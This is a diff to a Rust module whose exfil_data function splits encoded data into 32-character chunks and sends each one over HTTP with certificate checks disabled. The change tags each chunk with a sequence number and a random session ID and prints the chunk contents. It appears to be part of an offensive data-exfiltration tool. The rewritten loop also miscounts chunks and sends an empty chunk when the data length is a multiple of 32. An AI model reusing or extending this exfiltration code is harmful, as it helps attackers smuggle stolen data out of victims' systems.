@@ -2,6 +2,7 @@ use std::error::Error;
 use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
 use std::time::Duration;
 use std::cmp::min;
+use random_string::{charsets::ALPHA_LOWER, generate};
 
 mod config {
     include!(concat!(env!("OUT_DIR"), "/config.rs"));
@@ -27,6 +28,14 @@ async fn send_data(client: &reqwest::Client, encoded_chunk: &str) -> Result<(), 
 pub async fn exfil_data(encoded_data: &str) -> Result<(), Box<dyn Error>> {
     const CHUNK_SIZE: usize = 32;
 
+    #[cfg(feature = "debug")]
+    println!("[*] Generating ID...");
+
+    let id = generate(6, &ALPHA_LOWER);
+
+    #[cfg(feature = "debug")]
+    println!("[>] Using ID: {}", id);
+
     let client = reqwest::Client::builder()
         .http1_title_case_headers()
         .danger_accept_invalid_certs(true)
@@ -34,19 +43,31 @@ pub async fn exfil_data(encoded_data: &str) -> Result<(), Box<dyn Error>> {
         .build()?;
 
     let mut start = 0;
-    #[cfg(feature = "debug")]
-    let total_chunks = (encoded_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
+    let mut chunk_num = 1;
 
-    while start < encoded_data.len() {
+    loop {
         let end = min(start + CHUNK_SIZE, encoded_data.len());
+        let chunk = &encoded_data[start..end];
+        let total_chunks = encoded_data.len() / CHUNK_SIZE + 1;
+
         #[cfg(feature = "debug")] {
-            print!("\r[*] Sending chunk [{:02}/{}]", (start / CHUNK_SIZE) + 1, total_chunks);
             use std::io::{Write, stdout};
+            println!("[*] Sending chunk [{:02}/{}]", chunk_num, total_chunks);
             stdout().flush().unwrap();
         }
-        send_data(&client, &encoded_data[start..end]).await?;
+
+        println!("[*] Sending chunk: {}", chunk);
+
+        send_data(&client, &format!("{}.{}.{}", chunk, chunk_num, id)).await?;
+
         start = end;
+        chunk_num += 1;
+
+        if chunk.len() < CHUNK_SIZE {
+            break;
+        }
     }
+
     print!("\n");
 
     Ok(())
